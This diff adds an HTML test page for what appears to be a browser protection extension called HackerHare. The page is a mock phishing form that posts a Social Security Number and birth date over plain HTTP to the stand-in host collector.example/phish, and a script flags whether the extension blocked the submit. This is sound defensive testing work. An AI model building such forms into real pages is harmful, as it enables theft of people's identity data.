@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HackerHare — suspicious form</title>
+  </head>
+  <body>
+    <h1>Suspicious sensitive form</h1>
+    <p>
+      HTTP page + SSN field + insecure <code>action</code>. With shielding on, submit
+      should be blocked and <code>threat-count</code> should increment.
+    </p>
+    <form action="http://collector.example/phish" method="post">
+      <label>
+        Social Security Number
+        <input
+          type="text"
+          name="ssn"
+          id="user-ssn"
+          placeholder="XXX-XX-XXXX"
+          autocomplete="off"
+        />
+      </label>
+      <label>
+        Date of birth
+        <input type="text" name="birthdate" placeholder="MM/DD/YYYY" />
+      </label>
+      <button type="submit">Verify identity</button>
+    </form>
+    <p id="status" aria-live="polite"></p>
+    <script>
+      document.querySelector("form").addEventListener("submit", () => {
+        document.getElementById("status").textContent =
+          "If you see this, HackerHare did NOT block the submit."
+      })
+    </script>
+    <p><a href="index.html">Back to index</a></p>
+  </body>
+</html>
